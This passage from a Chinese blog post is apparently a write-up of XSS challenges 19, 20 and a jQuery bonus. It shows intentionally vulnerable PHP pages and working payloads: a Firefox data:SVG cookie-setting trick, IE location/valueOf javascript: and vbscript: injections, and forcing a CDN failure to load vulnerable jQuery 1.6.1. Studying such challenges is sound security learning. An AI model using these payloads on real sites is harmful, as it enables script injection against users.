<h3 id="19-Party"><a href="#19-Party" class="headerlink" title="19 Party"></a>19 Party</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Party</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> decodedCookie = <span class="title function_ invoke__">decodeURIComponent</span>(document.cookie);</span><br><span class="line">    <span class="keyword">var</span> ca = decodedCookie.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i];</span><br><span class="line">        <span class="keyword">while</span> (c.<span class="title function_ invoke__">charAt</span>(<span class="number">0</span>) == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">            c = c.<span class="title function_ invoke__">substring</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c.<span class="title function_ invoke__">indexOf</span>(name) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> c.<span class="title function_ invoke__">substring</span>(name.length, c.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> user=<span class="title function_ invoke__">getCookie</span>(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        document.<span class="title function_ invoke__">write</span>(<span class="string">&quot;欢迎， &quot;</span> + <span class="title function_ invoke__">unescape</span>(user));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请登录&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;checkCookie()&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;&lt;img name=&quot;avatar&quot; src=&quot;&#x27;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&amp;quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;link&quot;</span>]).<span class="string">&#x27;&quot; width=&quot;30&quot; height=&quot;40&quot;&gt;&#x27;</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>一个输出点在属性中，还把双引号给过滤了，这个地方基本就给xss判了死刑了。但是别忘了还有另一处输出点，就是js中获取cookie值并输出，我们可以修改cookie，构造一处DOM XSS。然而自己本地修改cookie连self xss都算不上，顶多哄自己开心。。。这里就用到<strong>FireFox</strong>的一项即为“方便”的功能——<strong>通过meta标签来设置cookie</strong>。</p>
<p><a target="_blank" rel="noopener" href="http://insert-script.blogspot.jp/2016/12/firefox-svg-cross-domain-cookie.html">http://insert-script.blogspot.jp/2016/12/firefox-svg-cross-domain-cookie.html</a></p>
<p>文中最后说需要data协议才可以成功，这道题恰好在img的src中有输出点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/svg xml,&lt;meta xmlns=&#x27;http://www.w3.org/1999/xhtml&#x27; http-equiv=&#x27;Set-Cookie&#x27; content=&#x27;username=&lt;script&gt;alert(1)&lt;/script&gt;&#x27; /&gt;</span><br></pre></td></tr></table></figure>

<p>由于使用data协议，所以整个内容需要urlencode一次，并且cookie在getCookie()中过了一次decodeURIComponent，在checkCookie中过了一次unescape，所以还要编码2次，也就是说cookie前后编码了三次。。。。最后payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/ali_xss_challenge/xss19.php?link=data:image%2fsvg%2bxml,%3Cmeta%20xmlns=%27http://www.w3.org/1999/xhtml%27%20http-equiv=%27Set-Cookie%27%20content=%27username=%25%32%35%33%43script%25%32%35%33%65alert%25%32%35%32%38document.domain%25%32%35%32%39%25%32%35%33%43%25%32%35%32%66script%25%32%35%33%65%27%20/%3E</span><br></pre></td></tr></table></figure>

<h3 id="20-THE-END"><a href="#20-THE-END" class="headerlink" title="20 THE END"></a>20 THE END</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    the end</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-Content-Type-Options: nosniff&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-FRAME-OPTIONS: DENY&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hookid</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;hookid&quot;</span>]));</span><br><span class="line"><span class="variable">$hookid</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$hookid</span>);</span><br><span class="line"><span class="variable">$hookid</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$hookid</span>);</span><br><span class="line"><span class="variable">$hookid</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$hookid</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">hookid=<span class="string">&#x27;&lt;?php echo $hookid;?&gt;&#x27;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>限制比较多，用到了ie比较老的一个漏洞。</p>
<p>payload（ie）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss20.php?hookid=&#x27;%2b&#123;valueOf:location,toString:[].pop,0:&#x27;javascript:alert%2528document.domain%2529&#x27;,length:1&#125;%2b&#x27;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/ali_xss_challenge/xss20.php?hookid=&#x27;%2b&#123;valueOf:location,toString:[].join,0:&#x27;vbscript:alert%2528document.domain%2529&#x27;,length:1&#125;%2b&#x27;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="番外-jQuery-（-）"><a href="#番外-jQuery-（-）" class="headerlink" title="番外 jQuery （***）"></a>番外 jQuery （***）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    jquery</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-Content-Type-Options: nosniff&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-FRAME-OPTIONS: DENY&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;https://code.jquery.com/jquery-3.2.1.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.jQuery || document.<span class="title function_ invoke__">write</span>(<span class="string">&#x27;&lt;script src=&quot;http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/jquery.js&quot;&gt;&lt;\/script&gt;&#x27;</span>); <span class="comment">//v1.6.1</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; $(location.hash) &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>juqery高版本不适合一些低版本的浏览器，或者意外因素(中国网络环境)，cdn的jqeury可能会加载失败，这时候就需要加载一下本地的jquery，本地加载的jquery版本为<code>1.6.1</code>是存在漏洞</p>
<p>但是网络环境不可控，为了稳定的让受害者加载带有漏洞的jquery，那么一定要<strong>让cdn的jquery加载失败</strong>～</p>
<p>只要请求远程cdn时有某个header，比如说referrer，超出了cdn服务器所能接受的范围，就会产生拒绝请求的现象，比如很长串的字符.</p>
<p>payload（chrome）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/ali_xss_challenge/xss21.php?a=a....(中间省略9000个a)#&lt;img src=1 onerror=alert(0)&gt;</span><br></pre></td></tr></table></figure>

<p>一些要注意的点：</p>
<ul>
<li>FF测试不成功，&lt;会url编码</li>
<li>safari，空格会自动%20编码</li>
<li><code>&lt;svg/onload=alert(1)&gt;</code>操作不会成功，因为网页是已经加载好了</li>
</ul>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>从8月底看到现在，从放假看到开学，总算把这21道题给走了一遍。学了很多姿势，感觉出题师傅是ie黑，各种针对。。。（ie：那又如何，老子还是银行政府的标配）</p>
<p>题目质量很高，有时候一下午就研究一两道题，但是感觉有些地方比较牵强，比如后端已经用htmlspecialchars过滤了，前端html的属性值依然用单引号包裹，可能实际确实有这种开发不规范的情况存在。总而言之，终于把一件大事做完的感觉，要学的东西还很多，继续努力吧。。。</p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = ""
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






</html>
